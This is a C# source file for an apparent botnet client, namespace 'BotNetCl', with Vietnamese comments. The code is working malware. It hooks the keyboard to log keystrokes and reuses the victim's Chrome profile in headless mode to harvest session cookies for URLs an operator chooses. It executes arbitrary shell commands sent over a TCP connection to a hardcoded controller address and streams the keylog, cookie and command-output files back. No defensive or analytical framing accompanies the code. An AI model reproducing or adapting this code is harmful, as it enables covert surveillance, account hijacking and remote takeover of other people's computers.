using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Windows.Forms;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using System.Reflection.Emit;
using OpenQA.Selenium.DevTools.V115.Page;
using System.Security.Policy;
using System.Threading;
using System.Runtime.InteropServices.ComTypes;

namespace BotNetCl
{
    class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
        static Thread th_doKeylogger;
        static Thread th_socket;

        static ASCIIEncoding encoding = new ASCIIEncoding();
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        static bool capsLockIsOn()
        {
            return Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
        }
      
        static bool checkWrite(int vkCode)
        {
            if (vkCode >= 48 && vkCode <= 57 ) // 0-9
            {
                return true;
            }
            else if (vkCode >= 65 && vkCode <= 90) //A-Z
            {
                return true;
            }
            else if(vkCode >= 97 && vkCode <= 122) // a-z
            {
                return true;
            }
            else if(vkCode == 32) // space
            {
                return true;
            }    
            return false;
        }

        static void WriteLog(int vkCode)// thiếu xử lí lên xuống trái phải backspace
        {
            //Console.InputEncoding = Encoding.UTF8;
            //Console.OutputEncoding = Encoding.UTF8;
            //Console.Write((char)vkCode);
            //Console.Write(vkCode);

            string logNameToWrite = "keylogger" + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);

            //Console.Write(vkCode); Console.Write(" ");
            //Console.WriteLine((char)vkCode);
            if (vkCode ==13)
            {
                sw.Write("\n");
            }  
            else if (vkCode==8)//? loi khong chay duoc backspace
            {
                //sw.Write("\b");
                //???
            }    
            if (Control.ModifierKeys == System.Windows.Forms.Keys.Shift) // de shift
            {
                if (vkCode == 49) { sw.Write("!"); Console.Write("!"); }//shift 1
                else if (vkCode == 50) { sw.Write("@"); Console.Write("@"); }//shift 2
                else if (vkCode == 51) { sw.Write("#"); Console.Write("#"); }//shift 3
                else if (vkCode == 52) { sw.Write("$"); Console.Write("$"); }//shift 4
                else if (vkCode == 53) { sw.Write("%"); Console.Write("%"); }//shift 5
                else if (vkCode == 54) { sw.Write("^"); Console.Write("^"); }//shift 6
                else if (vkCode == 55) { sw.Write("&"); Console.Write("&"); }//shift 7
                else if (vkCode == 56) { sw.Write("*"); Console.Write("*"); }//shift 8
                else if (vkCode == 57) { sw.Write("("); Console.Write("("); }//shift 9
                else if (vkCode == 48) { sw.Write(")"); Console.Write(")"); }//shift 0
                else if (vkCode == 187) { sw.Write("+"); Console.Write("+"); }
                else if (vkCode == 189) { sw.Write("_"); Console.Write("_"); }
                else if (vkCode ==  188) { sw.Write("<"); Console.Write("<"); }
                else if (vkCode == 190) { sw.Write(">"); Console.Write(">"); }
                else if (vkCode == 191) { sw.Write("?"); Console.Write("?"); }
                else if (vkCode == 219) { sw.Write("{"); Console.Write("{"); }
                else if (vkCode == 221) { sw.Write("}"); Console.Write("}"); }
                else if (vkCode == 220) { sw.Write("|"); Console.Write("|"); }
                else if (vkCode == 186) { sw.Write(":"); Console.Write(":"); }
                else if (vkCode == 222) { sw.Write("\""); Console.Write("\""); }
                else
                {

                    if (checkWrite(vkCode)) // de shift + capslock
                    {
                        if ( capsLockIsOn())
                        {
                            vkCode += 32;
                            Console.Write((char)vkCode);
                            sw.Write((char)vkCode);
                        }
                        else // de shift
                        {
                            Console.Write((char)vkCode);
                            sw.Write((char)vkCode);
                        }
                    }
                }

            }
            else // khong de shift
            {
                if (vkCode >= 65 && vkCode <= 90) // viet thuong
                {
                    vkCode += 32;
                }
                else if (vkCode == 187) { sw.Write("="); Console.Write("="); }
                else if (vkCode == 189) { sw.Write("-"); Console.Write("-"); }
                else if (vkCode == 188) { sw.Write(","); Console.Write(","); }
                else if (vkCode == 190) { sw.Write("."); Console.Write("."); }
                else if (vkCode == 191) { sw.Write("/"); Console.Write("/"); }
                else if (vkCode == 219) { sw.Write("["); Console.Write("["); }
                else if (vkCode == 221) { sw.Write("]"); Console.Write("]"); }
                else if (vkCode == 220) { sw.Write("\\"); Console.Write("\\"); }
                else if (vkCode == 186) { sw.Write(";"); Console.Write(";"); }
                else if (vkCode == 222) { sw.Write("'"); Console.Write("'"); }

                if (checkWrite(vkCode) )
                {
                    if (capsLockIsOn())
                    {
                        if (vkCode >= 97 && vkCode <= 122) // a-z
                        {
                             vkCode -= 32;
                        }
                        Console.Write((char)vkCode);
                        // sw.Write(" ");
                        sw.Write((char)vkCode);
                    }
                    else
                    {
                        Console.Write((char)vkCode);
                        // sw.Write(" ");
                        sw.Write((char)vkCode);
                    }
                }
            }
            sw.Close();
        }

        static void HookKeyboard()
        {
            Console.WriteLine("Bat dau chay keylogger");
            _hookID = SetHook(_proc);
            System.Windows.Forms.Application.Run();

            UnhookWindowsHookEx(_hookID);
        }
        #endregion

        private String verifyKey(int code)
        {
            String key = "";

            if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = "[Space]";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";

            return key;
        }


        public static bool IsAscii(char c)
        {
            return c < 128;
        }

        public static void getCookies(IWebDriver driver, string url)
        {
            try
            {
                // Navigate to Url
                driver.Navigate().GoToUrl(url);  
                // Get All available cookies
                var cookies = driver.Manage().Cookies.AllCookies;
                string cookiesString = "";
                foreach (var cookie in cookies)
                {
                    //Console.WriteLine($"Name: {cookie.Name}, Value: {cookie.Value}");
                    cookiesString += $"{cookie.Name}={cookie.Value};";
                    // Console.Write($"{cookie.Name}={cookie.Value};");
                }
                string logNameToWrite = "cookies"  + logExtendtion;
                StreamWriter sw = new StreamWriter(logNameToWrite, true);
                sw.WriteLine(DateTime.Now);
                sw.WriteLine(url);
                sw.WriteLine(cookiesString);
                sw.WriteLine("----------------------------------------------------------------------------------------");
                sw.Close();

            }
            finally
            {
            }
        }

        public static string RunCommandAndGetOutput(string command)
        {
            string output = "";

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe"; // Command prompt executable
                process.StartInfo.Arguments = "/c " + command; // /c flag tells cmd.exe to run the command and exit
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            string logNameToWrite = "cmdResult" + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.WriteLine(DateTime.Now);
            sw.WriteLine(output);

            sw.WriteLine("----------------------------------------------------------------------------------------");
            sw.Close();
            return output;
        }

        public static void sendFileSocket(TcpClient client,string type )
        {
            string fileName = "";
            if(type =="cookies")
            {
                fileName = "cookies.txt";
            }  
            else if (type =="keylogger")
            {
                fileName = "keylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }
            byte[] dataTemp = File.ReadAllBytes(fileName);
            byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);

            int bufferSize = 1024;

            NetworkStream stream = client.GetStream();
            stream.Write(dataLength, 0, 4);

            int bytesSent = 0;
            int bytesLeft = dataTemp.Length;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);

                stream.Write(dataTemp, bytesSent, curDataSize);

                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }
            
        }
        public static void handleCommand(string command, IWebDriver driver, TcpClient client, Stream stream)
        {
            byte[] data = new byte[BUFFER_SIZE];
            if (command.StartsWith("cookies"))
            {
                string url = command.Split('?')[1];
                getCookies(driver, url);
                Console.WriteLine("gui cookies");
                sendFileSocket(client, "cookies");
                Console.WriteLine("gui xong cookies");


            }
            else if (command.StartsWith("keylogger"))
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = SetHook(_proc);

                Console.WriteLine("gui keylogger");
                sendFileSocket(client, "keylogger");
                Console.WriteLine("gui xong keylogger");


            }
            else if (command.StartsWith("run cmd command"))
            {

                string cmd = command.Substring(15);
                Console.WriteLine("-------------------");
                Console.WriteLine(command);
                Console.WriteLine("-------------------");
                Console.WriteLine(cmd);
                Console.WriteLine("-------------------");
                RunCommandAndGetOutput(cmd);
                Console.WriteLine("gui command");
                sendFileSocket(client, "cmd");
                Console.WriteLine("gui xong command");

            }
            else if (command.StartsWith("exit"))
            {

                string str = "done";

                data = encoding.GetBytes(str);
                stream.Write(data, 0, data.Length);
                Console.WriteLine("xong exit");
                client.Close();
            }
        }
        public static void handleConnectSocket()
        {

            //<--------------------- set up get cookies-------------------------->
            ChromeOptions options = new ChromeOptions();
            string username = RunCommandAndGetOutput("echo %username%").Trim();
            string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
            options.AddArguments(path, "headless");
            IWebDriver driver = new ChromeDriver(options);
            Console.WriteLine("set up xong cookies");
            //<---------------------end get cookies-------------------------->
            try
            {
                TcpClient client = new TcpClient();

                // 1. connect
                client.Connect("192.168.50.121", PORT_NUMBER);
                Stream stream = client.GetStream();
                Console.WriteLine("connect xong socket");
            
                byte[] data;


                while (true)
                {
                    data = new byte[BUFFER_SIZE];
                    stream.Read(data, 0, BUFFER_SIZE);
                    string command = encoding.GetString(data);
                    handleCommand(command,driver,client,stream);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
            driver.Quit();
        }
        public static void Main(string[] args)
        {
            th_doKeylogger = new Thread(new ThreadStart(HookKeyboard));
            th_doKeylogger.SetApartmentState(ApartmentState.STA);
            th_doKeylogger.Start();
            th_socket = new Thread(new ThreadStart(handleConnectSocket));
            th_socket.SetApartmentState(ApartmentState.STA);
            th_socket.Start();
        }
        //public static void Main1(string[] args)
        //{
        //    // static Thread th_doKeylogger;
        //    // static Thread th_socket;

            


        //    //getCommandPrompt();
        //    //Console.WriteLine(RunCommandAndGetOutput("echo %username%"));
        //    // connectsocket();
        //    //_hookID = SetHook(_proc);
        //    //System.Windows.Forms.Application.Run();
        //    //string s = Console.ReadLine();
        //    //Console.WriteLine("echo %username%");

        //    // cookies tuong doi ok
        //    // Console.Write("Enter url:");
        //    //// https://www.instagram.com/

        //    // string url = Console.ReadLine().Trim();

        //    //string url1 = "https://www.instagram.com/";
        //    //getCookies(url1);

        //    //ctrl k ctrl d format code
        //    // ctrl f5

        //    //  connectsocket();


        //    // System.Windows.Forms.Application.Run();


        //    //<--------------------- set up get cookies-------------------------->
        //    ChromeOptions options = new ChromeOptions();
        //    string username = RunCommandAndGetOutput("echo %username%").Trim();
        //    string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";

        //    // options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
        //    //Console.WriteLine(path);
        //    options.AddArguments(path, "headless");
        //    // options.AddArgument("--enable - automation");
        //    //, "--headless"
        //    //options.AddArgument("headless");
        //    // options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");

        //    IWebDriver driver = new ChromeDriver(options);
        //    //<---------------------end get cookies-------------------------->
        //    try
        //    {
        //        TcpClient client = new TcpClient();

        //        // 1. connect
        //        client.Connect("192.168.50.121", PORT_NUMBER);
        //        Stream stream = client.GetStream();

        //        //// 2. send
        //        byte[] data;

  
        //        while (true)
        //        {
        //            data = new byte[BUFFER_SIZE];
        //            stream.Read(data, 0, BUFFER_SIZE);
        //            string command = encoding.GetString(data);

        //            if (command.StartsWith("cookies"))
        //            {
        //                string url = command.Split('?')[1];
        //                //Console.WriteLine("a");
        //                //Console.WriteLine(url);
        //                //Console.WriteLine("b");
        //                getCookies(driver,url);
        //                // data = new byte[BUFFER_SIZE];

        //                // data = encoding.GetBytes("cookies tra ve");


        //                ////
        //                //string str = " cookies tra ve";
        //                //data = encoding.GetBytes(str);
        //                ////

        //                //stream.Write(data, 0, data.Length);
        //                sendFileSocket(client,"cookies");


        //                Console.WriteLine("xong cookies");


        //            }
        //            else if (command.StartsWith("keylogger"))
        //            {
        //                //data = new byte[BUFFER_SIZE];
        //                //data = encoding.GetBytes("keylogger tra ve");
        //                //stream.Write(data, 0, data.Length);


        //                //string str = " keylogger tra ve";

        //                //data = encoding.GetBytes(str);
        //                //stream.Write(data, 0, data.Length);

        //                //Console.WriteLine("xong keylogger");
        //                Console.WriteLine("sending keylogger");

        //                sendFileSocket(client, "keylogger");


        //                Console.WriteLine("xong keylogger");


        //            }
        //            else if (command.StartsWith("run cmd command"))
        //            {
        //                stream.Read(data, 0, BUFFER_SIZE);
        //                string cmd = encoding.GetString(data);

        //                RunCommandAndGetOutput(cmd);

        //                sendFileSocket(client, "cookies");
        //                Console.WriteLine("xong command");




        //            }
        //            else if (command.StartsWith("exit"))
        //            {
        //                //data = new byte[BUFFER_SIZE];
        //                //data = encoding.GetBytes("keylogger tra ve");
        //                //stream.Write(data, 0, data.Length);


        //                string str = "done";

        //                data = encoding.GetBytes(str);
        //                stream.Write(data, 0, data.Length);
        //                Console.WriteLine("xong keylogger");
        //                client.Close();

        //            }
        //        }

        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine("Error: " + ex);
        //    }
           
        //}


    }

}


